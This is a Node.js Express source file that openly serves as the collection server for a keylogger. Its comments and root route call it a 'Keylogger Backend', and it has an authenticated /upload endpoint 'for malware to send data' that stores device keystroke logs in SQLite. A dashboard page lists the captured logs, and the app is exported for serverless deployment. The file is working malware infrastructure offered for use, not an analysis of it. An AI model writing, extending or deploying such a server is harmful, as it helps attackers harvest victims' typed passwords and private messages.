const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// === Basic security: change this to a strong secret ===
const SECRET_KEY = 'your-super-secret-key-12345-change-me';  // ← CHANGE THIS NOW!

// SQLite setup (file will be created automatically)
const db = new sqlite3.Database('./database.db', (err) => {
  if (err) {
    console.error('Database connection error:', err.message);
  } else {
    console.log('Connected to SQLite database.');
  }
});

// Create table if not exists
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      device TEXT NOT NULL,
      logs TEXT NOT NULL,
      timestamp TEXT NOT NULL,
      received_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// Middleware
app.use(bodyParser.json({ limit: '10mb' })); // Allow larger payloads if needed
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// === POST endpoint for malware to send data ===
app.post('/upload', (req, res) => {
  const authHeader = req.headers['authorization'];
  if (!authHeader || authHeader !== `Bearer ${SECRET_KEY}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const { device, logs, timestamp } = req.body;

  if (!device || !logs || !timestamp) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const stmt = db.prepare(
    'INSERT INTO logs (device, logs, timestamp) VALUES (?, ?, ?)'
  );
  stmt.run(device, logs, timestamp, function (err) {
    if (err) {
      console.error('Insert error:', err.message);
      return res.status(500).json({ error: 'Database error' });
    }
    res.status(200).json({ success: true, id: this.lastID });
  });
  stmt.finalize();
});

// === Dashboard page ===
app.get('/dashboard', (req, res) => {
  const auth = req.query.auth;
  if (auth !== SECRET_KEY) {
    return res.status(401).send('Access denied. Invalid auth key.');
  }

  db.all('SELECT * FROM logs ORDER BY received_at DESC', [], (err, rows) => {
    if (err) {
      console.error('Query error:', err.message);
      return res.status(500).send('Database error');
    }

    res.render('dashboard', { logs: rows });
  });
});

// Root route (just a simple message)
app.get('/', (req, res) => {
  res.send('Keylogger Backend is running. Use /dashboard?auth=yourkey to view logs.');
});

// For Vercel serverless (export as handler)
module.exports = app;